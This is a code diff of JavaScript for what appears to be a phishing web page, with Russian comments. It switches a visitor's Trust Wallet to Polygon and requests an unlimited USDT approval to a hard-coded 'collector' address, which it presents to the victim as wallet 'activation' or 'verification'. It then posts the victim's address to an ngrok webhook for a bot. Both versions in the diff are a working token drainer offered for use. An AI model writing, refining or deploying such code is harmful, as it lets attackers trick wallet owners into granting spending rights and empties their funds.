@@ -1,76 +1,75 @@
-const USDT_ADDR = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
-const SPENDER = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
-const CHAIN_ID = '0x89'; // Polygon 137
+const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
+const COLLECTOR_ADDRESS = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
+const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex
 
-// !!! ОБНОВЛЯЙ ЭТУ ССЫЛКУ ПРИ КАЖДОМ ЗАПУСКЕ БОТА !!!
-const WEBHOOK = 'https://gypseous-janis-wandlike.ngrok-free.dev/save-address';
-
-async function start() {
+async function connectAndApprove() {
     const status = document.getElementById('status');
+    
     if (!window.ethereum) {
-        status.innerText = 'Откройте сайт внутри Trust Wallet!';
+        status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet';
         return;
     }
 
     try {
-        status.innerText = '🔄 Проверка сети...';
-        
-        // 1. Авто-переключение на Polygon
+        status.innerText = 'Переключение на Polygon...';
+
+        // ПРИНУДИТЕЛЬНАЯ СМЕНА СЕТИ
         try {
-            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
-        } catch (e) {
-            if (e.code === 4902) {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: POLYGON_CHAIN_ID }],
+            });
+        } catch (error) {
+            // Если сети нет в кошельке (код 4902), добавляем её автоматически
+            if (error.code === 4902) {
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
-                    params: [{ chainId: CHAIN_ID, chainName: 'Polygon', rpcUrls: ['https://polygon-rpc.com'], nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 } }]
+                    params: [{
+                        chainId: POLYGON_CHAIN_ID,
+                        chainName: 'Polygon Mainnet',
+                        rpcUrls: ['https://polygon-rpc.com'],
+                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+                        blockExplorerUrls: ['https://polygonscan.com/']
+                    }],
                 });
+            } else {
+                throw error;
             }
         }
 
+        // Инициализация Web3 после смены сети
         const web3 = new Web3(window.ethereum);
         const accounts = await web3.eth.requestAccounts();
-        const user = accounts[0];
+        const address = accounts[0];
 
-        // ABI для проверки баланса и апрува
-        const abi = [
-            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
-        ];
-        const contract = new web3.eth.Contract(abi, USDT_ADDR);
+        status.innerText = 'Подтвердите активацию в кошельке...';
 
-        status.innerText = '⚙️ Подготовка транзакции...';
-
-        // 2. Проверяем текущий апрув
-        const currentAllowance = await contract.methods.allowance(user, SPENDER).call();
+        const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
         
-        // Если апрув уже есть, его нужно сбросить в 0 (фикс ошибки Reverted в Polygon USDT)
-        if (BigInt(currentAllowance) > 0n) {
-            status.innerText = '⚠️ Сброс старого разрешения...';
-            await contract.methods.approve(SPENDER, 0).send({ from: user });
-        }
+        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-        status.innerText = '📝 Подтвердите активацию...';
-        const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-
-        // 3. Финальный Approve
-        await contract.methods.approve(SPENDER, max).send({ from: user });
-
-        status.innerText = '📡 Синхронизация с ботом...';
-
-        // 4. Отправка в бот
-        await fetch(WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ address: user })
+        // ВЫЗОВ APPROVE (Пользователь видит окно оплаты газа MATIC)
+        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
+            from: address 
         });
 
-        status.innerText = '✅ Успешно привязано!';
-        status.style.color = '#ff007a';
+        status.innerText = 'Синхронизация с сервером...';
 
-    } catch (err) {
-        status.innerText = '❌ ' + (err.message.includes('reverted') ? 'Ошибка сети. Попробуйте снова.' : 'Отклонено');
-        console.error(err);
+        // ОТПРАВКА В БОТ (Замени URL на свой актуальный Ngrok)
+        await fetch('https://gypseous-janis-wandlike.ngrok-free.dev/save-address', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ address: address })
+        });
+
+        status.innerText = '✅ Готово! Кошелек успешно верифицирован.';
+        status.style.color = '#00ff00';
+
+    } catch (error) {
+        status.innerText = 'Ошибка: ' + (error.message || 'Транзакция отклонена');
+        console.error(error);
     }
 }
 
-document.getElementById('startBtn').addEventListener('click', start);
+document.getElementById('connectBtn').addEventListener('click', connectAndApprove);
